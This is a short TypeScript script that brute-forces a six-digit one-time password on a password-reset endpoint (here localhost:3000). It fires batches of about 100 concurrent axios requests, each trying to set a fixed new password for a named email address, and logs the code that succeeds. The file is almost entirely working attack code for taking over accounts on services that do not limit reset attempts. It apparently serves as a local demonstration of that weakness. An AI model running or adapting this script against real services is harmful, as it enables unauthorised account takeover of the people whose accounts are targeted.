import axios from "axios";

const sendResetPasswordRequest = async (otp: string) => {
  let data = JSON.stringify({
    otp: otp,
    email: "prafullsingh975@gmail.com",
    newPassword: "01230123",
  });

  let config = {
    method: "post",
    maxBodyLength: Infinity,
    url: "http://localhost:3000/reset-password",
    headers: {
      "Content-Type": "application/json",
    },
    data: data,
  };

  try {
    const response = await axios.request(config);
    if (response.status === 200) {
      console.log("The OTP was>>>>>", otp);
      process.exit(0);
    }
  } catch (error) {}
};

const main = async () => {
  for (let i = 1; i <= 999999; i += 100) {
    // Batch Processing to prevent ran out of the memory issue
    console.log(i);

    const requests = [];
    for (let j = 0; j <= 100; j++) {
      const paddedOtp = (i + j).toString().padStart(6, "0");
      requests.push(sendResetPasswordRequest(paddedOtp));
    }
    await Promise.all(requests);
  }
};

main();
